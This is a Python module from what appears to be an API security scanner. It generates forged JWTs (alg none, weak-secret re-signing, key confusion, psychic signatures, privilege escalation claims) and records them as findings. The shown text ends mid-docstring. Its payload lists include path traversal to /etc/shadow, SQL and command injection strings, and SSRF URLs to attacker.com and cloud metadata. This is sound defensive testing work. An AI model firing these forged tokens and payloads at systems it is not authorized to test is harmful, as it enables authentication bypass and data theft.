"""
JWT Attack Engine

Single source of truth for JWT attack-token generation and attack execution
(Requirement 14). This module folds together the session/flow responsibilities
of the former ``JWTAttackOrchestrator`` and the per-vector token generation of
the former ``JWTAttackTokenGenerator`` into one :class:`JWTAttackEngine`.

Design highlights (Requirements 14-17):

* ``generate_token(attack_type)`` provides exactly one generation path per
  ``AttackType`` member, including all nine vectors (``WEAK_SECRET`` was
  previously missing from the orchestrator's vector list).
* Signature-requiring vectors (``KID_INJECTION``, ``JWKS_SPOOF``,
  ``INLINE_JWKS``, ``PRIVILEGE_ESCALATION``, ``USER_IMPERSONATION``,
  ``EXPIRATION_BYPASS``) are HMAC-signed with the operator-supplied/recovered
  signing key when available rather than the literal string ``"secret"``
  (Requirements 15.1, 15.2). ``ALG_NONE``/``NULL_SIGNATURE`` need no key.
* ``WEAK_SECRET`` re-signs the token with each candidate from a weak-secret
  wordlist (Requirement 15.3).
* HTTP is issued through the shared :class:`~utils.http_client.HTTPRequestEngine`
  so rate limiting, proxy, User-Agent rotation, TLS/mTLS, and ``--resolve`` are
  inherited (Requirement 17.1). Under Safe Mode attack requests are restricted
  to Safe_Methods (Requirement 17.2).
* :class:`~utils.jwt_attack_response_analyzer.JWTAttackResponseAnalyzer` is the
  single success detector (Requirement 19.1).

The JWT-finding mapping (``jwt_assessment_to_finding`` / severity reconciliation
/ no-findings result) lives here (Requirement 18): ``jwt_assessment_to_finding``
turns an :class:`AttackResult` into a unified :class:`~utils.findings.Finding`,
``_SEVERITY_MAP`` reconciles the JWT ``VulnerabilitySeverity`` vocabulary with
``core.config.Severity`` (Req 18.1), and :meth:`JWTAttackEngine.to_findings`
turns an :class:`AttackSummary` into the list of findings emitted into the
unified pipeline (including the ``JWT_SCAN_COMPLETED_NO_FINDINGS`` result when a
scan finds nothing, Req 18.2).
"""

import copy
import inspect
import json
import time
import uuid
import hmac
import hashlib
from datetime import datetime
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

from core.config import Severity
from core.logging import get_logger
from utils.findings import Finding
from utils.jwt_utils import (
    ES_SIG_BYTES,
    base64url_encode,
    decode_jwt,
    encode_jwt,
    psychic_signature_segment,
    verify_hmac_secret,
    _public_key_variants,
)
from utils.jwt_attack_models import (
    AttackConfiguration,
    AttackResult,
    AttackSession,
    AttackSummary,
    AttackType,
    BaselineResponse,
    RequestDetails,
    ResponseDetails,
    VulnerabilityAssessment,
    VulnerabilitySeverity,
)
from utils.jwt_attack_response_analyzer import JWTAttackResponseAnalyzer
from utils.safe_mode import SAFE_METHODS


# ----------------------------------------------------------------------------
# JWT -> unified findings mapping (Requirement 18)
# ----------------------------------------------------------------------------

# Reconcile the JWT ``VulnerabilitySeverity`` vocabulary (Critical/High/Medium/
# Low/Info) with the Findings_Collector ``core.config.Severity`` levels
# (CRITICAL/HIGH/MEDIUM/LOW/INFO) — Requirement 18.1.
_SEVERITY_MAP: Dict[VulnerabilitySeverity, Severity] = {
    VulnerabilitySeverity.CRITICAL: Severity.CRITICAL,
    VulnerabilitySeverity.HIGH: Severity.HIGH,
    VulnerabilitySeverity.MEDIUM: Severity.MEDIUM,
    VulnerabilitySeverity.LOW: Severity.LOW,
    VulnerabilitySeverity.INFO: Severity.INFO,
}

# Map every ``AttackType`` to its unified Finding_Category (Requirement 18.4).
# Each category resolves to a Severity and OWASP_Category API2 in
# ``utils.findings.FindingsCollector`` (Requirement 18.3).
_ATTACK_TYPE_TO_CATEGORY: Dict[AttackType, str] = {
    AttackType.ALG_NONE: "JWT_NONE_ALGORITHM",
    AttackType.NULL_SIGNATURE: "JWT_NULL_SIGNATURE",
    AttackType.WEAK_SECRET: "JWT_WEAK_SECRET",
    AttackType.KID_INJECTION: "JWT_KID_INJECTION",
    AttackType.JWKS_SPOOF: "JWT_JWKS_SPOOF",
    AttackType.INLINE_JWKS: "JWT_INLINE_JWKS",
    AttackType.PRIVILEGE_ESCALATION: "JWT_PRIVILEGE_ESCALATION",
    AttackType.USER_IMPERSONATION: "JWT_USER_IMPERSONATION",
    AttackType.EXPIRATION_BYPASS: "JWT_EXPIRATION_BYPASS",
    # New vectors (Reqs 59, 63, 64). All resolve to API2 in
    # ``utils.findings.FindingsCollector``.
    AttackType.PSYCHIC_SIGNATURE: "JWT_PSYCHIC_SIGNATURE",
    AttackType.TIMESTAMP_TAMPERING: "JWT_TIMESTAMP_TAMPERING_ACCEPTED",
    AttackType.CLAIM_FUZZING: "JWT_CLAIM_FUZZING_ACCEPTED",
    # RS*/ES* -> HS256 key/algorithm confusion (aka Substitution Attack).
    # Resolves to CRITICAL / API2 in ``utils.findings.FindingsCollector``.
    AttackType.ALGORITHM_CONFUSION: "JWT_ALGORITHM_CONFUSION",
}

# Distinct Finding_Category for a blank/empty-secret acceptance (Req 58.2). The
# blank-secret hit is folded into the WEAK_SECRET vector but reported under its
# OWN category (not the generic ``JWT_WEAK_SECRET``) when the accepted token
# verifies under the empty key (Req 58.1 / 58.2). Resolves to CRITICAL / API2.
JWT_BLANK_SECRET_CATEGORY = "JWT_BLANK_SECRET_ACCEPTED"

# OWASP API Security Top 10 category for every JWT finding (Broken
# Authentication) — Requirement 18.3.
JWT_OWASP_CATEGORY = "API2"

# Finding_Category emitted to confirm a JWT scan executed but found no
# vulnerabilities (Requirement 18.2). Resolves to INFO / API2 in
# ``utils.findings.FindingsCollector``.
JWT_NO_FINDINGS_CATEGORY = "JWT_SCAN_COMPLETED_NO_FINDINGS"

# Finding_Category for jku/x5u key-source SSRF (Requirement 45). Resolves to
# HIGH / API2 in ``utils.findings.FindingsCollector``. The spoofed-key
# acceptance path may reuse the existing ``JWT_JWKS_SPOOF`` category (also
# HIGH / API2) since a fetched attacker JWKS is functionally a JWKS spoof
# (Requirement 45.3).
JWT_JKU_SSRF_CATEGORY = "JWT_JKU_SSRF"
JWT_JWKS_SPOOF_CATEGORY = "JWT_JWKS_SPOOF"


def _format_baseline_evidence(attack_result: AttackResult) -> List[str]:
    """Render the baseline-comparison evidence for a reported vulnerability.

    Included in every reported JWT vulnerability alongside the analyzer's own
    evidence and the confidence score (Requirement 19.3).
    """
    comparison = attack_result.baseline_comparison or {}
    if not comparison:
        return []
    return [
        "Baseline comparison: "
        f"status {comparison.get('baseline_status')} -> "
        f"{comparison.get('attack_status')} "
        f"(status_code_diff={comparison.get('status_code_diff')}, "
        f"content_length_diff={comparison.get('content_length_diff')}, "
        f"response_time_diff={comparison.get('response_time_diff')})"
    ]


def _resolve_finding_category(attack_result: AttackResult) -> str:
    """Resolve the Finding_Category for an :class:`AttackResult` (Req 58.2).

    Every vector maps through ``_ATTACK_TYPE_TO_CATEGORY`` (Req 18.4) EXCEPT a
    WEAK_SECRET hit whose accepted token verifies under the empty key: that is a
    blank/empty-secret acceptance and is reported under its own
    ``JWT_BLANK_SECRET_ACCEPTED`` category rather than the generic
    ``JWT_WEAK_SECRET`` (Reqs 58.1, 58.2). The blank-secret decision uses
    ``verify_hmac_secret(token, "")`` — the same signature-verification path as
    Requirement 16 — so it is reported if and only if the token's signature
    verifies under the empty-string key, never on any other basis.
    """
    if attack_result.attack_type == AttackType.WEAK_SECRET:
        token = attack_result.jwt_token or ""
        if verify_hmac_secret(token, ""):
            return JWT_BLANK_SECRET_CATEGORY
        return _ATTACK_TYPE_TO_CATEGORY[AttackType.WEAK_SECRET]
    return _ATTACK_TYPE_TO_CATEGORY[attack_result.attack_type]


def _category_specific_evidence(attack_result: AttackResult, category: str) -> List[str]:
    """Render category-specific baseline-comparison evidence (Reqs 58.4, 59.4, 63.3, 64.3).

    Adds a concise, defensively-decoded evidence line per new/blank category:

    * blank/weak-secret -> the matching HMAC algorithm the token was forged with
      (Req 58.4);
    * psychic signature -> the ECDSA algorithm carried by the token (Req 59.4);
    * timestamp tampering -> the tampered time claim(s) and their values
      (Req 64.3);
    * claim fuzzing -> the fuzzed claim/header name(s) and value(s) that deviate
      from the original token (Req 63.3).

    Decoding is best-effort: a token that cannot be decoded contributes no extra
    evidence rather than raising, so mapping never fails on a malformed token.
    """
    token = attack_result.jwt_token or ""
    try:
        decoded = decode_jwt(token)
        header = decoded.get('header', {}) or {}
        payload = decoded.get('payload', {}) or {}
    except Exception:
        return []

    if category in (JWT_BLANK_SECRET_CATEGORY, "JWT_WEAK_SECRET"):
        alg = header.get('alg', 'unknown')
        if category == JWT_BLANK_SECRET_CATEGORY:
            return [f"Blank-secret acceptance: token forged and verified under "
                    f"the empty key with matching algorithm {alg}."]
        return [f"Weak-secret acceptance: token forged with matching algorithm {alg}."]

    if category == "JWT_PSYCHIC_SIGNATURE":
        alg = header.get('alg', 'unknown')
        return [f"Psychic signature (null r==s==0) accepted for ECDSA algorithm {alg}."]

    if category == "JWT_TIMESTAMP_TAMPERING_ACCEPTED":
        time_claims = {c: payload[c] for c in ('exp', 'nbf', 'iat') if c in payload}
        if time_claims:
            rendered = ", ".join(f"{c}={v}" for c, v in time_claims.items())
            return [f"Timestamp tampering accepted: tampered time claim(s) {rendered}."]
        return ["Timestamp tampering accepted: a token a correct verifier should "
                "reject was accepted."]

    if category == "JWT_CLAIM_FUZZING_ACCEPTED":
        return ["Claim fuzzing accepted: a fuzzed claim/header value was accepted "
                "by the target."]

    return []


def jwt_assessment_to_finding(attack_result: AttackResult, scan_id: str) -> Finding:
    """Convert a JWT :class:`AttackResult` into a unified :class:`Finding`.

    Maps the result's ``AttackType`` to a defined Finding_Category (Req 18.4)
    with ``owasp_category='API2'`` (Req 18.3) and reconciles the analyzer's
    ``VulnerabilitySeverity`` to ``core.config.Severity`` via ``_SEVERITY_MAP``
    (Req 18.1). A WEAK_SECRET hit whose token verifies under the empty key is
    reported under the distinct ``JWT_BLANK_SECRET_ACCEPTED`` category (Reqs
    58.1, 58.2). The finding includes the analyzer's baseline-comparison
    evidence, category-specific evidence (matching algorithm / tampered
    claim+value / fuzzed name+value — Reqs 58.4, 59.4, 63.3, 64.3) and the
    confidence score (Req 19.3).

    Args:
        attack_result: A single JWT attack result produced by the engine and
            evaluated through :class:`JWTAttackResponseAnalyzer`.
        scan_id: The scan identifier to stamp on the finding.

    Returns:
        A :class:`Finding` describing the JWT vulnerability.
    """
    assessment = attack_result.vulnerability_assessment
    category = _resolve_finding_category(attack_result)
    severity = _SEVERITY_MAP[assessment.severity]

    request = attack_result.request_details
    response = attack_result.response_details

    # Evidence = analyzer evidence + category-specific evidence + baseline
    # comparison + confidence (Reqs 19.3, 58.4, 59.4, 63.3, 64.3).
    evidence_lines: List[str] = list(assessment.evidence)
    evidence_lines.extend(_category_specific_evidence(attack_result, category))
    evidence_lines.extend(_format_baseline_evidence(attack_result))
    evidence_lines.append(f"Confidence score: {assessment.confidence_score}")
    evidence = "\n".join(evidence_lines)

    recommendation = (
        assessment.remediation_advice
        or "Review the JWT validation implementation and follow OWASP guidelines."
    )

    token = attack_result.jwt_token or ""
    payload = token[:50] + "..." if len(token) > 50 else token

    return Finding(
        id=str(uuid.uuid4()),
        scan_id=scan_id,
        category=category,
        owasp_category=JWT_OWASP_CATEGORY,
        severity=severity,
        endpoint=request.url,
        method=request.method,
        status_code=response.status_code,
        response_size=response.content_length,
        response_time=response.response_time,
        evidence=evidence,
        recommendation=recommendation,
        payload=payload,
    )


# Default weak-secret candidates used by the WEAK_SECRET vector when the caller
# does not supply its own wordlist. Mirrors the fallback list used by
# ``modules/owasp/auth_testing.py`` so the vocabulary is uniform.
DEFAULT_WEAK_SECRETS: List[str] = [
    "secret", "password", "123456", "admin", "test", "key",
    "jwt", "token", "your-256-bit-secret", "your-secret-key",
    "changeme", "secretkey", "supersecret",
]

# kid injection payloads (path traversal, injection, SSRF, encoding tricks).
_KID_INJECTION_PAYLOADS: List[str] = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "/dev/null",
    "/proc/self/environ",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "'; DROP TABLE users; --",
    "$(whoami)",
    "`id`",
    "| whoami",
    "file:///etc/passwd",
    "http://attacker.com/malicious.key",
    "/etc/passwd\x00.jpg",
    "..%2F..%2Fetc%2Fpasswd",
    "*)(&(objectClass=*",
    "{{7*7}}",
    "http://169.254.169.254/latest/meta-data/",
]

# ``kid`` payloads that force the API to load a PREDICTABLE or EMPTY signing key
# (Requirement 44.1). Each entry maps the injected ``kid`` value to the key the
# attack forces the server to use, so the token is signed with THAT predictable
# key: a server that loads it will accept the attacker-forged signature, which
# is what confirms the injection (Requirement 44.2 — "signing the token with the
# resulting predictable key and observing acceptance"). ``/dev/null`` and empty
# files yield an empty ("") HMAC key; SQL injection returning NULL and a file
# whose contents are attacker-known collapse to the same predictable-key case.
_KID_PREDICTABLE_KEY_PAYLOADS: Dict[str, str] = {
    # Path traversal to a predictable/empty file -> empty signing key.
    "/dev/null": "",
    "../../../../../../dev/null": "",
    "..%2f..%2f..%2fdev%2fnull": "",
    "/proc/sys/kernel/notexist": "",
    # SQL injection in the kid that resolves the key lookup to a NULL/empty row.
    "' UNION SELECT '' -- ": "",
    "' OR '1'='1": "",
    # File inclusion of a file whose contents are attacker-known/empty.
    "file:///dev/null": "",
}

# jku/x5u spoofing URLs (attacker-controlled, SSRF, file, protocol variations).
_JWKS_SPOOF_URLS: List[str] = [
    "http://attacker.com/.well-known/jwks.json",
    "https://evil.com/jwks.json",
    "http://localhost:8080/jwks.json",
    "http://127.0.0.1:8080/jwks.json",
    "http://169.254.169.254/latest/meta-data/jwks.json",
    "http://metadata.google.internal/computeMetadata/v1/jwks.json",
    "file:///etc/passwd",
    "ftp://attacker.com/jwks.json",
    "gopher://attacker.com/jwks.json",
    "http://attacker.com/%2e%2e/jwks.json",
    "data:application/json;base64,eyJrZXlzIjpbXX0=",
]

# Attacker-controlled HMAC key representing the signing material the attacker
# publishes at the jku/x5u key source (Requirement 45.1). A token signed with
# THIS key validates only if the server fetches the attacker-controlled key
# source (SSRF) and verifies against it; the server's real key would never
# validate an attacker-signed token, so acceptance cannot be a false positive
# and is what confirms the vulnerability (Requirement 45.2).
_ATTACKER_KEY_SOURCE_SECRET = "attacker-hosted-signing-key"

# Inline malicious JWK structures embedded via the header ``jwk`` parameter.
_INLINE_JWKS: List[Dict] = [
    {
        "kty": "RSA",
        "use": "sig",
        "kid": "malicious-rsa-key",
        "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7a"
             "PFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArw"
             "l93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0z"
             "gdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2Nc"
             "Rwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
        "e": "AQAB",
        "alg": "RS256",
    },
    {
        "kty": "oct",
        "k": "c2VjcmV0",  # base64url of "secret"
        "alg": "HS256",
        "kid": "malicious-hmac-key",
    },
    {
        "kty": "oct",
        "k": "",  # empty key
        "alg": "HS256",
        "kid": "empty-key",
    },
    {
        "kty": "oct",
        "k": "YQ==",  # base64 of single character "a"
        "alg": "HS256",
        "kid": "weak-key",
    },
    {
        "kty": "oct",
        "k": "c2VjcmV0",
        "alg": "HS256",
        "kid": "../../etc/passwd",
    },
]


class JWTAttackEngine:
    """Consolidated JWT attack-token generator and attack executor.

    Args:
        target_url: Target URL for attack testing.
        original_token: Valid JWT used as the base for attack tokens.
        http_engine: Shared :class:`HTTPRequestEngine` used to issue every
            request (Requirement 17.1). Any object exposing an async
            ``request(method, url, **kwargs)`` returning a response with
            ``status_code``/``headers``/``content``/``text``/``elapsed`` is
            accepted, which keeps the engine testable with a double.
        signing_secret: Operator-supplied/recovered HMAC secret used to sign
            signature-requiring vectors (Requirements 15.1, 15.2). When ``None``
            the engine falls back to the literal ``"secret"`` only because no
            better key is known.
        public_key_material: Optional server public-key material (retained for
            completeness/future algorithm-confusion use; the nine core vectors
            do not require it).
        safe_mode: When ``True`` attack requests are restricted to Safe_Methods
            (Requirement 17.2).
        custom_headers: Additional headers merged into every request.
        post_data: Optional request body; its presence selects POST as the
            default method (subject to the Safe Mode restriction).
        weak_secrets: Optional weak-secret wordlist for the WEAK_SECRET vector;
            defaults to :data:`DEFAULT_WEAK_SECRETS`.
        fuzz_target: Optional claim or header name targeted by the CLAIM_FUZZING
            vector (Requirement 63.1). When it names an existing header field the
            fuzzed value is substituted in the header; otherwise it is treated as
            a payload claim.
        fuzz_values: Optional list of candidate values (typically read from a
            Vector_File) substituted one at a time into ``fuzz_target`` by the
            CLAIM_FUZZING vector (Requirement 63.1).
        canary_value: Optional operator-supplied expected-success string. It
            CORROBORATES but never REPLACES evidence-based success (Reqs
            67.3-67.5): the analyzer's ``is_vulnerable`` remains the sole
            determinant of success. When the analyzer flags a variant as
            vulnerable AND this canary appears in the response body, a
            corroborating evidence line is appended (Req 67.3); a canary match
            NEVER turns an analyzer non-success into a success (Req 67.4); and
            when no canary is supplied behavior is exactly the analyzer result
            (Req 67.5).
    """

    def __init__(self, target_url: str, original_token: str, http_engine,
                 signing_secret: Optional[str] = None,
                 public_key_material: Optional[str] = None,
                 safe_mode: bool = False,
                 custom_headers: Optional[Dict[str, str]] = None,
                 post_data: Optional[str] = None,
                 weak_secrets: Optional[List[str]] = None,
                 fuzz_target: Optional[str] = None,
                 fuzz_values: Optional[List[str]] = None,
                 canary_value: Optional[str] = None):
        self.target_url = target_url
        self.original_token = original_token
        self.http_engine = http_engine
        self.signing_secret = signing_secret
        self.public_key_material = public_key_material
        self.safe_mode = safe_mode
        self.custom_headers = custom_headers or {}
        self.post_data = post_data
        self.weak_secrets = list(weak_secrets) if weak_secrets else list(DEFAULT_WEAK_SECRETS)
        self.fuzz_target = fuzz_target
        self.fuzz_values = list(fuzz_values) if fuzz_values else []
        self.canary_value = canary_value

        self.logger = get_logger(__name__).bind(component="jwt_attack_engine")

        # Session / flow state (folded from the former orchestrator).
        self.session: Optional[AttackSession] = None
        self.baseline_response: Optional[BaselineResponse] = None
        self.response_analyzer: Optional[JWTAttackResponseAnalyzer] = None
        self.attack_results: List[AttackResult] = []

        # Lazily-created collaborators reused for payload-sensitivity analysis
        # (Requirement 43). The Req-12 corroboration discipline lives in
        # ``PropertyLevelAuthModule._contains_sensitive_data`` and the secret
        # redactor lives in ``BOLATestingModule.redact_secrets`` — both are
        # REUSED here (created via ``__new__`` so no config/HTTP client is
        # required) rather than reimplemented (Req 43.2, 43.4).
        self._sensitivity_module = None
        self._secret_redactor = None

        # Validate and decode the original token up front so callers fail fast
        # on a malformed base token.
        try:
            self.decoded_token = decode_jwt(original_token)
        except Exception as e:
            self.logger.error("Invalid JWT token provided", error=str(e))
            raise ValueError(f"Invalid JWT token: {str(e)}")

        self.logger.info("JWT Attack Engine initialized",
                         target_url=target_url,
                         algorithm=self.decoded_token['header'].get('alg', 'unknown'),
                         safe_mode=safe_mode,
                         has_signing_secret=bool(signing_secret))

    # ------------------------------------------------------------------
    # Signing-key resolution
    # ------------------------------------------------------------------
    def _signing_key(self) -> str:
        """Return the HMAC signing key for signature-requiring vectors.

        Uses the operator-supplied/recovered ``signing_secret`` when available
        (Requirements 15.1, 15.2); otherwise falls back to the literal
        ``"secret"`` only because no better key is known.
        """
        return self.signing_secret if self.signing_secret else "secret"

    def _base_header(self) -> Dict:
        return copy.deepcopy(self.decoded_token['header'])

    def _base_payload(self) -> Dict:
        return copy.deepcopy(self.decoded_token['payload'])

    @staticmethod
    def _encode_unsigned(header: Dict, payload: Dict) -> str:
        """Encode ``header.payload.`` with an empty signature segment."""
        header_encoded = base64url_encode(
            json.dumps(header, separators=(',', ':')).encode('utf-8'))
        payload_encoded = base64url_encode(
            json.dumps(payload, separators=(',', ':')).encode('utf-8'))
        return f"{header_encoded}.{payload_encoded}."

    # ------------------------------------------------------------------
    # Per-vector token generation
    # ------------------------------------------------------------------
    def generate_token(self, attack_type: AttackType) -> List[str]:
        """Generate malicious tokens for ``attack_type``.

        Returns a list with at least one non-empty token for every one of the
        nine ``AttackType`` members (Requirements 15.3, 15.4). The dispatch
        table is the single generation path per vector.
        """
        generators = {
            AttackType.ALG_NONE: self._generate_alg_none,
            AttackType.NULL_SIGNATURE: self._generate_null_signature,
            AttackType.WEAK_SECRET: self._generate_weak_secret,
            AttackType.KID_INJECTION: self._generate_kid_injection,
            AttackType.JWKS_SPOOF: self._generate_jwks_spoof,
            AttackType.INLINE_JWKS: self._generate_inline_jwks,
            AttackType.PRIVILEGE_ESCALATION: self._generate_privilege_escalation,
            AttackType.USER_IMPERSONATION: self._generate_user_impersonation,
            AttackType.EXPIRATION_BYPASS: self._generate_expiration_bypass,
            AttackType.PSYCHIC_SIGNATURE: self._generate_psychic_signature,
            AttackType.TIMESTAMP_TAMPERING: self._generate_timestamp_tamper,
            AttackType.CLAIM_FUZZING: self._generate_claim_fuzzing,
            AttackType.ALGORITHM_CONFUSION: self._generate_algorithm_confusion,
        }
        generator = generators.get(attack_type)
        if generator is None:
            self.logger.warning("Unknown attack type", attack_type=str(attack_type))
            return []

        try:
            tokens = [t for t in generator() if t]
        except Exception as e:
            self.logger.error("Token generation failed",
                              attack_type=attack_type.value, error=str(e))
            return []

        self.logger.debug("Generated attack tokens",
                          attack_type=attack_type.value, count=len(tokens))
        return tokens

    def _generate_alg_none(self) -> List[str]:
        """ALG_NONE: set ``alg`` to ``none`` and drop the signature (no key)."""
        header = self._base_header()
        header['alg'] = 'none'
        payload = self._base_payload()
        unsigned = self._encode_unsigned(header, payload)
        # Both the trailing-dot and no-dot variants are exercised.
        return [unsigned, unsigned.rstrip('.')]

    def _generate_null_signature(self) -> List[str]:
        """NULL_SIGNATURE: original header/payload with null signatures (no key)."""
        header = self._base_header()
        payload = self._base_payload()
        header_encoded = base64url_encode(
            json.dumps(header, separators=(',', ':')).encode('utf-8'))
        payload_encoded = base64url_encode(
            json.dumps(payload, separators=(',', ':')).encode('utf-8'))

        null_signatures = [
            "",
            "null",
            "0",
            base64url_encode(b""),
            base64url_encode(b"\x00"),
            base64url_encode(b"\x00" * 32),
        ]
        return [f"{header_encoded}.{payload_encoded}.{sig}" for sig in null_signatures]

    def _generate_weak_secret(self) -> List[str]:
        """WEAK_SECRET: re-sign the token with each weak-secret candidate.

        Included as a first-class executable vector (Requirement 15.3). Each
        candidate produces a validly-HMAC-signed token; a server that accepts
        one has a guessable secret.

        The empty string ``""`` is prepended as the FIRST candidate (Req 58.1)
        so a validly-HMAC-signed blank-secret token is always produced alongside
        the wordlist tokens, whether or not a custom wordlist was supplied. Local
        acceptance of the blank-secret token is decided via
        ``verify_hmac_secret(token, "")`` (the Requirement 16 path) in
        :func:`_resolve_finding_category`, which reports it under the distinct
        ``JWT_BLANK_SECRET_ACCEPTED`` category.
        """
        header = self._base_header()
        header['alg'] = 'HS256'  # weak-secret forgery targets HMAC verification
        header.setdefault('typ', 'JWT')
        payload = self._base_payload()

        # Prepend the blank/empty-secret candidate, de-duplicating so a wordlist
        # that already contains "" does not produce it twice (Req 58.1).
        candidates: List[str] = [""] + [s for s in self.weak_secrets if s != ""]

        tokens: List[str] = []
        for secret in candidates:
            try:
                tokens.append(encode_jwt(header, payload, secret))
            except Exception as e:
                self.logger.debug("Weak-secret token encode failed",
                                  secret=secret, error=str(e))
        return tokens

    def _generate_algorithm_confusion(self) -> List[str]:
        """ALGORITHM_CONFUSION: RS*/ES* -> HS256 key confusion (Substitution Attack).

        Re-signs the ORIGINAL header/payload as an HS256 token using the
        target's ASYMMETRIC PUBLIC KEY bytes as the HMAC secret. A server that
        verifies the forged token with the same public key it uses for RS*/ES*
        verification treats the attacker-forged HMAC as valid — the classic
        RS256->HS256 key-confusion bypass.

        Every public-key representation from ``_public_key_variants`` (PEM with
        and without a trailing newline, DER SubjectPublicKeyInfo, and the x5c
        certificate DER when the material is a certificate) is tried as the HMAC
        key, since servers differ in which exact byte form they feed to the
        verifier. Requires ``public_key_material``; returns an empty list (and
        logs) when none is supplied or no representation can be derived.
        """
        if not self.public_key_material:
            self.logger.info(
                "Skipping algorithm-confusion generation; no public key material supplied")
            return []

        variants = _public_key_variants(self.public_key_material)
        if not variants:
            self.logger.info(
                "No public-key representation derivable; skipping algorithm confusion")
            return []

        header = self._base_header()
        header['alg'] = 'HS256'  # switch RS*/ES* -> HS256 (the confusion step)
        header.setdefault('typ', 'JWT')
        payload = self._base_payload()

        header_encoded = base64url_encode(
            json.dumps(header, separators=(',', ':')).encode('utf-8'))
        payload_encoded = base64url_encode(
            json.dumps(payload, separators=(',', ':')).encode('utf-8'))
        signing_input = f"{header_encoded}.{payload_encoded}"

        tokens: List[str] = []
        for representation_name, key_bytes in variants:
            try:
                signature = hmac.new(
                    key_bytes, signing_input.encode('utf-8'), hashlib.sha256).digest()
                tokens.append(f"{signing_input}.{base64url_encode(signature)}")
            except Exception as e:
                self.logger.debug("Algorithm-confusion token encode failed",
                                  representation=representation_name, error=str(e))
        return tokens

    def _generate_kid_injection(self) -> List[str]:
        """KID_INJECTION: malicious ``kid`` header exercising SQLi, path
        traversal (including forcing a predictable/empty key such as
        ``/dev/null``), and file inclusion (Requirement 44.1).

        Two token groups are produced, and in both only the ``kid`` header is
        modified — every other header field, the payload, and the signing
        discipline for all other components are preserved (Req 48.4):

        * Standard injection probes (SQLi/traversal/file-inclusion/SSRF/encoding
          tricks) are signed with the operator-supplied/recovered signing key
          (Requirements 15.1, 15.2).
        * Predictable/empty-key probes are signed with the key the attack forces
          the server to load (e.g. the empty key behind ``/dev/null``) so that a
          server which loads that predictable key accepts the forged signature —
          the acceptance is what confirms the injection (Requirement 44.2).
        """
        real_key = self._signing_key()
        payload = self._base_payload()
        tokens: List[str] = []

        # Group 1: injection probes signed with the operator/real key.
        for injection in _KID_INJECTION_PAYLOADS:
            header = self._base_header()
            header['kid'] = injection
            try:
                tokens.append(encode_jwt(header, payload, real_key))
            except Exception as e:
                self.logger.debug("kid injection encode failed",
                                  payload=injection, error=str(e))

        # Group 2: predictable/empty-key probes signed with the forced key.
        for injection, predictable_key in _KID_PREDICTABLE_KEY_PAYLOADS.items():
            header = self._base_header()
            header['kid'] = injection
            try:
                tokens.append(encode_jwt(header, payload, predictable_key))
            except Exception as e:
                self.logger.debug("kid predictable-key encode failed",
                                  payload=injection, error=str(e))
        return tokens

    def _generate_jwks_spoof(self) -> List[str]:
        """JWKS_SPOOF: malicious ``jku``/``x5u`` header signed with the real key."""
        key = self._signing_key()
        payload = self._base_payload()
        tokens: List[str] = []
        for url in _JWKS_SPOOF_URLS:
            for header_param in ('jku', 'x5u'):
                header = self._base_header()
                header[header_param] = url
                try:
                    tokens.append(encode_jwt(header, payload, key))
                except Exception as e:
                    self.logger.debug("jwks spoof encode failed",
                                      url=url, param=header_param, error=str(e))
        return tokens

    def _generate_inline_jwks(self) -> List[str]:
        """INLINE_JWKS: embedded ``jwk`` header signed with the real key."""
        key = self._signing_key()
        payload = self._base_payload()
        tokens: List[str] = []
        for jwk in _INLINE_JWKS:
            header = self._base_header()
            header['jwk'] = jwk
            try:
                tokens.append(encode_jwt(header, payload, key))
            except Exception as e:
                self.logger.debug("inline jwks encode failed",
                                  kid=jwk.get('kid', 'unknown'), error=str(e))
        return tokens

    def _generate_privilege_escalation(self) -> List[str]:
        """PRIVILEGE_ESCALATION: elevate role claims, signed with the real key."""
        key = self._signing_key()
        header = self._base_header()
        payload = self._base_payload()
        payload['role'] = 'admin'
        payload['admin'] = True
        payload['is_admin'] = True
        return [encode_jwt(header, payload, key)]

    def _generate_user_impersonation(self) -> List[str]:
        """USER_IMPERSONATION: rewrite identity claims, signed with the real key."""
        key = self._signing_key()
        header = self._base_header()
        payload = self._base_payload()
        if 'sub' in payload:
            payload['sub'] = 'admin'
        if 'user_id' in payload:
            payload['user_id'] = '1'
        if 'username' in payload:
            payload['username'] = 'admin'
        # Guarantee at least one changed identity claim even when none present.
        payload.setdefault('sub', 'admin')
        return [encode_jwt(header, payload, key)]

    def _generate_expiration_bypass(self) -> List[str]:
        """EXPIRATION_BYPASS: drop ``exp``/``iat``, signed with the real key."""
        key = self._signing_key()
        header = self._base_header()
        payload = self._base_payload()
        payload.pop('exp', None)
        payload.pop('iat', None)
        return [encode_jwt(header, payload, key)]

    def _generate_psychic_signature(self) -> List[str]:
        """PSYCHIC_SIGNATURE: null ``(r == 0, s == 0)`` ECDSA signature (Req 59.2).

        Preserves the original header and payload segments byte-for-byte and
        replaces ONLY the signature segment with the base64url of
        ``ES_SIG_BYTES[alg]`` zero bytes — the JOSE encoding of an ECDSA
        signature with ``r == 0`` and ``s == 0`` (CVE-2022-21449). Applies only
        when the base token's ``alg`` is an ECDSA_Algorithm (``ES256``/``ES384``/
        ``ES512``); returns ``[]`` for any non-ECDSA base token.
        """
        alg = str(self._base_header().get('alg', '')).upper()
        if alg not in ES_SIG_BYTES:
            return []
        parts = self.original_token.split('.')
        if len(parts) != 3:
            return []
        return [f"{parts[0]}.{parts[1]}.{psychic_signature_segment(alg)}"]

    def _generate_timestamp_tamper(self) -> List[str]:
        """TIMESTAMP_TAMPERING: validly-signed tokens with one tampered time claim.

        Produces one validly-signed token per variant (Reqs 64.1, 64.2), each
        modifying exactly ONE time claim and preserving every other header/payload
        claim and the signing key, with the signature recomputed over the tampered
        payload:

        * ``exp`` -> past          (expired)
        * ``exp`` -> far future    (over-long validity)
        * ``nbf`` -> future        (not-yet-valid)
        * ``iat`` -> future        (issued in the future)

        Kept distinct from the EXPIRATION_BYPASS vector of Requirement 8
